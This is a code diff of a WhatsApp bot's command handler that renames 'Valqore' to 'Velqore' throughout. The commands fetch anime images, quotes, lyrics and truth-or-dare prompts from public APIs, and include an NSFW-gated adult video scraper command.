+if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/randomnime2.json')
+if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/rize.json')
+if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/rose.json')
+if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/ryujin.json')
+if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/sagiri.json')
+if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/sakura.json')
+if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/sasuke.json')
+if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/satanic.json')
+if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/shina.json')
+if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/shinka.json')
+if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/shinomiya.json')
+if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/shizuka.json')
+if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/shota.json')
+if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/tatasurya.json')
+if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/technology.json')
+if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/tejina.json')
+if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/toukachan.json')
+if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/tsunade.json')
+if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/waifu.json')
+if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/wallhp.json')
+if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/wallml.json')
+if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/wallnime.json')
+if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/yotsuba.json')
+if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/yuki.json')
+if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/yulibocil.json')
+if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/yumeko.json')
 let yeha = heyy[Math.floor(Math.random() * heyy.length)]
-ValqoreInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
 }
 break
 case 'lyrics': {
-if (!text) return replygcValqore(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
-await ValqoreStickWait()
+if (!text) return replygcVelqore(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
+await VelqoreStickWait()
 const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
 const result = await lyricsv2(text).catch(async _ => await lyrics(text))
-replygcValqore(`
+replygcVelqore(`
 *Title :* ${result.title}
 *Author :* ${result.author}
 *Url :* ${result.link}
@@ -5156,20 +5152,20 @@ replygcValqore(`
 }
 break
 case 'pick': {
-            	if (!m.isGroup) return ValqoreStickGroup()
-            	if (!text) return replygcValqore(`What do you want to pick?\nExample: ${prefix + command} idiot`)
-             const groupMetadata = m.isGroup ? await ValqoreInc.groupMetadata(m.chat)
+            	if (!m.isGroup) return VelqoreStickGroup()
+            	if (!text) return replygcVelqore(`What do you want to pick?\nExample: ${prefix + command} idiot`)
+             const groupMetadata = m.isGroup ? await VelqoreInc.groupMetadata(m.chat)
                  .catch((e) => {}) : ""
              const participants = m.isGroup ? await groupMetadata.participants : ""
              let member = participants.map((u) => u.id)
              let me = m.sender
-             let Valqoreshimts = member[Math.floor(Math.random() * member.length)]
-             ValqoreInc.sendMessage(from, { 
-text: `The most *${text}* here is *@${Valqoreshimts.split("@")[0]}*`,
+             let Velqoreshimts = member[Math.floor(Math.random() * member.length)]
+             VelqoreInc.sendMessage(from, { 
+text: `The most *${text}* here is *@${Velqoreshimts.split("@")[0]}*`,
 contextInfo:{
 forwardingScore: 9999999,
 isForwarded: true, 
-mentionedJid:[Valqoreshimts],
+mentionedJid:[Velqoreshimts],
 "externalAdReply": {
 "showAdAttribution": true,
 "title": ` ${global.botname}`,
@@ -5177,7 +5173,7 @@ mentionedJid:[Valqoreshimts],
 "containsAutoReply": true,
 "previewType": "PHOTO",
 "thumbnailUrl": ``,
-"thumbnail": fs.readFileSync(`./ValqoreMedia/theme/cheemspic.jpg`),
+"thumbnail": fs.readFileSync(`./VelqoreMedia/theme/cheemspic.jpg`),
 "sourceUrl": `${wagc}`
 }
 }
@@ -5185,16 +5181,16 @@ mentionedJid:[Valqoreshimts],
          }
      break
      case 'say': case 'tts': case 'gtts':{
-if (!text) return replygcValqore('Where is the text?')
+if (!text) return replygcVelqore('Where is the text?')
             let texttts = text
-            const Valqorerl = googleTTS.getAudioUrl(texttts, {
+            const Velqorerl = googleTTS.getAudioUrl(texttts, {
                 lang: "en",
                 slow: false,
                 host: "https://translate.google.com",
             })
-            return ValqoreInc.sendMessage(m.chat, {
+            return VelqoreInc.sendMessage(m.chat, {
                 audio: {
-                    url: Valqorerl,
+                    url: Velqorerl,
                 },
                 mimetype: 'audio/mp4',
                 ptt: true,
@@ -5206,13 +5202,13 @@ if (!text) return replygcValqore('Where is the text?')
         break
     case 'fact': {
     	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
-        return replygcValqore(`${themeemoji} *Fact:* ${data.fact}\n`)   
+        return replygcVelqore(`${themeemoji} *Fact:* ${data.fact}\n`)   
     }
     break
     case 'quotes':
-const quoteValqorey = await axios.get(`https://favqs.com/api/qotd`)
-        const textquotes = `*${themeemoji} Quote:* ${quoteValqorey.data.quote.body}\n\n*${themeemoji} Author:* ${quoteValqorey.data.quote.author}`
-return replygcValqore(textquotes)
+const quoteVelqorey = await axios.get(`https://favqs.com/api/qotd`)
+        const textquotes = `*${themeemoji} Quote:* ${quoteVelqorey.data.quote.body}\n\n*${themeemoji} Author:* ${quoteVelqorey.data.quote.author}`
+return replygcVelqore(textquotes)
 break
 case 'dare':
               const dare =[
@@ -5286,7 +5282,7 @@ case 'dare':
     "shout you bastard in front of your mom/papa",
     "change the name to i am idiot for 24 hours",
     "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
-    "say i love the bot owner Valqore through voice note",
+    "say i love the bot owner Velqore through voice note",
     "send your gf/bf pic here",
     "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
     "breakup with your best friend for 5hrs without telling him/her that its a dare",
@@ -5298,9 +5294,9 @@ case 'dare':
      "put your father name on status for 5hrs",
      "send abusive words in any grup, excepting this grup, and send screenshot proof here"
 ]
-              const Valqoredare = dare[Math.floor(Math.random() * dare.length)]
+              const Velqoredare = dare[Math.floor(Math.random() * dare.length)]
               bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
-              ValqoreInc.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ Valqoredare }, {quoted:m})
+              VelqoreInc.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ Velqoredare }, {quoted:m})
               break
                             break
        case 'truth':
@@ -5375,7 +5371,7 @@ case 'dare':
     "Mention the incident that makes you hurt that you still remember",
     "what achievements have you got this year?",
     "what was your worst habit at school?",
-    "do you love the bot creator, Valqore?ðŸ¤£",
+    "do you love the bot creator, Velqore?ðŸ¤£",
     "have you ever thought of taking revenge from ur teacher?",
     "do you like current prime minister of ur country",
     "you non veg or veg",
@@ -5395,9 +5391,9 @@ case 'dare':
     "Whats the strangest dream you have ever had",
     "do you play pubg, if you then send ur id number"
 ]
-              const Valqoretruth = truth[Math.floor(Math.random() * truth.length)]
+              const Velqoretruth = truth[Math.floor(Math.random() * truth.length)]
               buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
-              ValqoreInc.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Valqoretruth }, {quoted:m})
+              VelqoreInc.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Velqoretruth }, {quoted:m})
               break
               case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
 case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
@@ -5408,7 +5404,7 @@ case 'shinobu': case 'handhold': {
 
 axios.get(`https://api.waifu.pics/sfw/${command}`)
 .then(({data}) => {
-ValqoreInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
+VelqoreInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
 })
 }
 break
@@ -5425,344 +5421,344 @@ case 'meow':
 case 'tickle':{
                 axios.get(`https://nekos.life/api/v2/img/${command}`)
 .then(({data}) => {
-ValqoreInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
+VelqoreInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
 })
 }
 break
 case 'animeawoo':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animemegumin':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animeshinobu':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animehandhold':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animehighfive':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animecringe':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animedance':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animehappy':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animeglomp':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animesmug':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animeblush':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animewave':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animesmile':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animepoke':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animewink':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animebonk':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animebully':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animeyeet':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animebite':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animelick':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animekill':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animecry':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animewlp':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animekiss':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animehug':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animeneko':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animepat':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animeslap':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animecuddle':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animewaifu':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animenom':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animefoxgirl':{
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
-            await ValqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animetickle': {
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
-            await ValqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animegecg': {
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
-            await ValqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'dogwoof': {
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
-            await ValqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case '8ballpool': {
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
-            await ValqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'goosebird': {
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
-            await ValqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animefeed': {
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
-            await ValqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'animeavatar': {
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
-            await ValqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'lizardpic': {
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
-            await ValqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'catmeow': {
-await ValqoreStickWait()
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
-            await ValqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                     return('Error!')
                 })
                 }
 break
 case 'anime': {
-if (!text) return replygcValqore(`Which anime are you lookin for?`)
+if (!text) return replygcVelqore(`Which anime are you lookin for?`)
 const malScraper = require('mal-scraper')
-await ValqoreStickWait()
+await VelqoreStickWait()
         const anime = await malScraper.getInfoFromName(text).catch(() => null)
-        if (!anime) return replygcValqore(`Could not find`)
+        if (!anime) return replygcVelqore(`Could not find`)
 let animetxt = `
 🎀 *Title: ${anime.title}*
 🎋 *Type: ${anime.type}*
@@ -5778,145 +5774,145 @@ let animetxt = `
 ♦️ *Trailer: ${anime.trailer}*
 🌐 *URL: ${anime.url}*
 ❄ *Description:* ${anime.synopsis}*`
-                await ValqoreInc.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
+                await VelqoreInc.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                 }
                 break
 case 'hentaivid': case 'hentai': case 'hentaivideo': {
-	if (!m.isGroup) return ValqoreStickGroup()
-if (!AntiNsfw) return replygcValqore(mess.nsfw)
-                await ValqoreStickWait()
+	if (!m.isGroup) return VelqoreStickGroup()
+if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+                await VelqoreStickWait()
                 const { hentai } = require('./lib/scraper.js')
                 anu = await hentai()
                 result912 = anu[Math.floor(Math.random(), anu.length)]
-                ValqoreInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
